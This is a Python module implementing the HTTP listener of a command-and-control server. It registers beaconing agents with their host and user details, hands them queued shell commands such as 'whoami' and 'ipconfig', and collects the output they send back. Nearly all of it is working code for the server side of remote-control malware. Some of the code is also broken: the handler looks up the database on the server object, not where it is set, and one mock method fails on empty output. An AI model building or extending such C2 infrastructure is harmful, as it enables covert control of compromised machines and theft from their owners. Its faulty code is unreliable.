import http.server
import socketserver
import threading
import json
import os
import sys
import uuid # For generating session IDs if agent doesn't provide
import time # For MockDBManager checkin_time

# Add necessary paths to sys.path for imports
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'utils'))
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'database'))
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'core'))

from logger import setup_logger
from db_manager import DBManager
# No encoder needed directly here for simple JSON, but keep it for future if using custom encoding

logger = setup_logger('http_listener', 'http_listener.log')

class C2HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
    """
    Custom HTTP request handler for the C2 server.
    Handles incoming beaconing, registration, and task output.
    """
    def do_GET(self):
        """Handle GET requests (e.g., agent beaconing, task retrieval)."""
        logger.debug(f"Received GET request from {self.client_address[0]}: {self.path}")
        # Example path: /beacon?session_id=<ID>&info=<agent_info_base64>
        # Example path: /tasks?session_id=<ID>

        if self.path.startswith('/beacon'):
            self._handle_beacon()
        elif self.path.startswith('/tasks'):
            self._handle_task_request()
        else:
            self._send_404()

    def do_POST(self):
        """Handle POST requests (e.g., agent sending task output)."""
        logger.debug(f"Received POST request from {self.client_address[0]}: {self.path}")
        # Example path: /output
        # Data in POST body: JSON {session_id: ..., task_id: ..., output: ...}

        if self.path == '/output':
            self._handle_output()
        else:
            self._send_404()

    def _send_response(self, status_code, content_type, content):
        """Helper to send HTTP responses."""
        self.send_response(status_code)
        self.send_header('Content-type', content_type)
        self.end_headers()
        self.wfile.write(content.encode('utf-8'))

    def _send_404(self):
        """Sends a 404 Not Found response."""
        self._send_response(404, 'text/plain', 'Not Found')
        logger.warning(f"404 Not Found for path: {self.path} from {self.client_address[0]}")

    def _handle_beacon(self):
        """Handles agent beaconing and initial registration."""
        params = self.path.split('?', 1)
        if len(params) < 2:
            self._send_404()
            return

        query_string = params[1]
        query_params = dict(qc.split('=', 1) for qc in query_string.split('&') if '=' in qc)

        session_id = query_params.get('session_id')
        agent_info_str = query_params.get('info') # Expected format: hostname|username|os_info

        if not session_id or not agent_info_str:
            logger.warning(f"Malformed beacon request from {self.client_address[0]}. Missing session_id or info.")
            self._send_response(400, 'text/plain', 'Bad Request: Missing session_id or info.')
            return

        # Decode agent_info_str if it was Base64 encoded by the agent
        # For simple HTTP, we'll assume direct string for now to avoid early complexity
        # agent_info_str = DataEncoder.decode(agent_info_str) # If using encoder

        hostname, username, os_info = "Unknown", "Unknown", "Unknown"
        try:
            parts = agent_info_str.split('|')
            if len(parts) == 3:
                hostname, username, os_info = parts
            else:
                logger.warning(f"Agent info string malformed: {agent_info_str}")
        except Exception as e:
            logger.error(f"Error parsing agent info: {e}", exc_info=True)

        # Get the actual IP from the request
        agent_ip = self.client_address[0]

        # Use the DBManager from the server context
        db_manager = self.server.db_manager # Access DBManager via the server instance
        agent_exists = db_manager.add_agent(session_id, hostname, username, os_info, agent_ip)

        if agent_exists:
            logger.info(f"Beacon/Registration from Session ID: {session_id}, Host: {hostname}, IP: {agent_ip}")
            # Respond with a simple ACK or pending tasks (later)
            self._send_response(200, 'text/plain', 'ACK')
        else:
            logger.error(f"Failed to process beacon/registration for {session_id}")
            self._send_response(500, 'text/plain', 'Internal Server Error')


    def _handle_output(self):
        """Handles agent sending back command output."""
        try:
            content_length = int(self.headers['Content-Length'])
            post_body = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(post_body)

            session_id = data.get('session_id')
            task_id = data.get('task_id')
            output = data.get('output')

            if not session_id or not task_id or output is None:
                logger.warning(f"Malformed output POST from {self.client_address[0]}. Missing fields.")
                self._send_response(400, 'text/plain', 'Bad Request: Missing data.')
                return

            db_manager = self.server.db_manager
            # Need to get agent_id from session_id
            agent_db_entry = db_manager.get_agent_by_session_id(session_id) # Need to implement this in DBManager
            if not agent_db_entry:
                logger.warning(f"Output received for unknown session_id: {session_id}")
                self._send_response(404, 'text/plain', 'Agent Not Found')
                return

            if db_manager.update_task_status(task_id, 'completed', output):
                logger.info(f"Output for task {task_id} from {session_id} received and updated.")
                self._send_response(200, 'text/plain', 'ACK')
            else:
                logger.error(f"Failed to update task {task_id} status for {session_id}.")
                self._send_response(500, 'text/plain', 'Internal Server Error')

        except json.JSONDecodeError:
            logger.warning(f"Invalid JSON in POST body from {self.client_address[0]}")
            self._send_response(400, 'text/plain', 'Bad Request: Invalid JSON.')
        except Exception as e:
            logger.error(f"Error handling output POST from {self.client_address[0]}: {e}", exc_info=True)
            self._send_response(500, 'text/plain', 'Internal Server Error')

    def _handle_task_request(self):
        """Handles agent requesting pending tasks."""
        params = self.path.split('?', 1)
        if len(params) < 2:
            self._send_404()
            return

        query_string = params[1]
        query_params = dict(qc.split('=', 1) for qc in query_string.split('&') if '=' in qc)
        session_id = query_params.get('session_id')

        if not session_id:
            logger.warning(f"Malformed task request from {self.client_address[0]}. Missing session_id.")
            self._send_response(400, 'text/plain', 'Bad Request: Missing session_id.')
            return

        db_manager = self.server.db_manager
        agent_db_entry = db_manager.get_agent_by_session_id(session_id)
        if not agent_db_entry:
            logger.warning(f"Task request from unknown session_id: {session_id}")
            self._send_response(404, 'text/plain', 'Agent Not Found')
            return

        # Get pending tasks for this agent
        pending_tasks = db_manager.get_pending_tasks(agent_db_entry['id'])
        if pending_tasks:
            # We'll send one task at a time for simplicity
            task = pending_tasks[0]
            # Mark task as 'sent'
            db_manager.update_task_status(task['id'], 'sent')
            response_payload = {
                "task_id": task['id'],
                "command": task['command']
            }
            logger.info(f"Sending task {task['id']} '{task['command']}' to agent {session_id}")
            self._send_response(200, 'application/json', json.dumps(response_payload))
        else:
            # No pending tasks, send an empty response or ACK
            logger.debug(f"No pending tasks for agent {session_id}. Sending no-op.")
            self._send_response(200, 'application/json', json.dumps({"command": "noop"})) # Agent should understand "noop"


class HTTPListener:
    def __init__(self, host, port, db_manager: DBManager):
        self.host = host
        self.port = port
        self.db_manager = db_manager
        self.httpd = None
        self.server_thread = None
        self.running = False
        logger.info(f"HTTPListener initialized on {host}:{port}")

    def _run_server(self):
        """Runs the HTTP server."""
        try:
            # Create a custom handler that has access to the DBManager
            # This is a bit of a hack around BaseHTTPRequestHandler's design
            handler_class = C2HTTPRequestHandler
            handler_class.db_manager = self.db_manager # Pass DBManager instance to handler

            # Use socketserver.TCPServer to avoid issues with address reuse during rapid restarts
            # The allow_reuse_address is for the server itself, not the handler
            socketserver.TCPServer.allow_reuse_address = True
            self.httpd = socketserver.TCPServer((self.host, self.port), handler_class)

            logger.info(f"HTTP Server listening on {self.host}:{self.port}...")
            self.httpd.serve_forever() # Blocks until server is shut down
        except Exception as e:
            logger.error(f"Error starting HTTP server: {e}", exc_info=True)
            self.running = False # Mark as not running if startup failed

    def start(self):
        """Starts the HTTP listener in a separate thread."""
        if not self.running:
            self.running = True
            self.server_thread = threading.Thread(target=self._run_server, daemon=True)
            self.server_thread.start()
            logger.info("HTTP Listener started successfully in background thread.")

    def stop(self):
        """Stops the HTTP listener."""
        if self.running:
            logger.info("Stopping HTTP listener...")
            self.running = False
            if self.httpd:
                self.httpd.shutdown() # Shuts down the serve_forever loop
                self.httpd.server_close() # Closes the socket
            if self.server_thread and self.server_thread.is_alive():
                self.server_thread.join(timeout=5) # Wait for thread to finish
                if self.server_thread.is_alive():
                    logger.warning("HTTP Listener thread did not terminate gracefully.")
            logger.info("HTTP Listener stopped.")

# Example usage for testing this module directly
if __name__ == "__main__":
    print("--- HTTP Listener Test ---")
    print("This will run a simple HTTP server on port 8080.")
    print("You can test with your browser: http://localhost:8080/beacon?session_id=test1234&info=TESTPC|testuser|Win10")
    print("Or with curl: curl http://localhost:8080/beacon?session_id=test1234&info=TESTPC|testuser|Win10")
    print("To test output: curl -X POST -H 'Content-Type: application/json' -d '{\"session_id\": \"test1234\", \"task_id\": 1, \"output\": \"test output\"}' http://localhost:8080/output")
    print("Press Ctrl+C to stop.\n")

    # Mock DBManager for testing
    class MockDBManager:
        def __init__(self):
            self.agents = {} # session_id: {id: ..., hostname: ...}
            self.agent_id_counter = 0
            self.tasks = {
                1: {'agent_id': 1, 'command': 'whoami', 'status': 'pending'},
                2: {'agent_id': 1, 'command': 'ipconfig', 'status': 'pending'}
            }
            logger.info("[MockDB] Initialized with some dummy tasks.")

        def add_agent(self, session_id, hostname, username, os_info, ip_address):
            # Simulate add_agent returning True for success or False for failure
            if session_id not in self.agents:
                self.agent_id_counter += 1
                new_agent = {
                    'id': self.agent_id_counter,
                    'session_id': session_id,
                    'hostname': hostname,
                    'username': username,
                    'os_info': os_info,
                    'ip_address': ip_address,
                    'checkin_time': time.strftime("%Y-%m-%d %H:%M:%S"),
                    'status': 'active'
                }
                self.agents[session_id] = new_agent
                logger.info(f"[MockDB] Agent registered: {session_id}, ID: {self.agent_id_counter}")
            else:
                self.agents[session_id]['checkin_time'] = time.strftime("%Y-%m-%d %H:%M:%S")
                self.agents[session_id]['ip_address'] = ip_address # Update IP on check-in
                logger.info(f"[MockDB] Agent updated: {session_id}")
            return True # Always simulate success for simplicity

        def get_agent_by_session_id(self, session_id):
            # This is important for the HTTP handler!
            # It simulates querying the DB for an agent by its session ID
            for agent in self.agents.values():
                if agent['session_id'] == session_id:
                    return agent
            return None

        def get_all_agents(self):
            return list(self.agents.values())

        def get_agent_by_id(self, agent_id):
            for agent in self.agents.values():
                if agent['id'] == agent_id:
                    return agent
            return None


        def add_task(self, agent_id, command):
            new_task_id = max(self.tasks.keys()) + 1 if self.tasks else 1
            self.tasks[new_task_id] = {'agent_id': agent_id, 'command': command, 'status': 'pending'}
            logger.info(f"[MockDB] Task {new_task_id} added for agent {agent_id}: {command}")
            return True

        def get_pending_tasks(self, agent_id):
            pending = []
            for task_id, task_data in self.tasks.items():
                if task_data['agent_id'] == agent_id and task_data['status'] == 'pending':
                    # IMPORTANT: In a real DB, task_id would be naturally available.
                    # Here, we add it back as a dictionary key for the mock.
                    task_data_copy = task_data.copy()
                    task_data_copy['id'] = task_id
                    pending.append(task_data_copy)
            return pending

        def update_task_status(self, task_id, status, output=None):
            if task_id in self.tasks:
                self.tasks[task_id]['status'] = status
                if output:
                    self.tasks[task_id]['output'] = output
                logger.info(f"[MockDB] Task {task_id} status updated to {status}. Output: {output[:50]}...")
                return True
            logger.warning(f"[MockDB] Task {task_id} not found for update.")
            return False

    mock_db = MockDBManager()

    HTTP_HOST = "0.0.0.0" # Listen on all available interfaces
    HTTP_PORT = 8080      # Choose an unprivileged port for easier local testing

    listener = HTTPListener(HTTP_HOST, HTTP_PORT, mock_db)

    try:
        listener.start()
        while True:
            time.sleep(1) # Keep main thread alive
    except KeyboardInterrupt:
        logger.info("\nCtrl+C detected. Shutting down HTTP Listener.")
    finally:
        listener.stop()
        logger.info("HTTP Listener stopped.")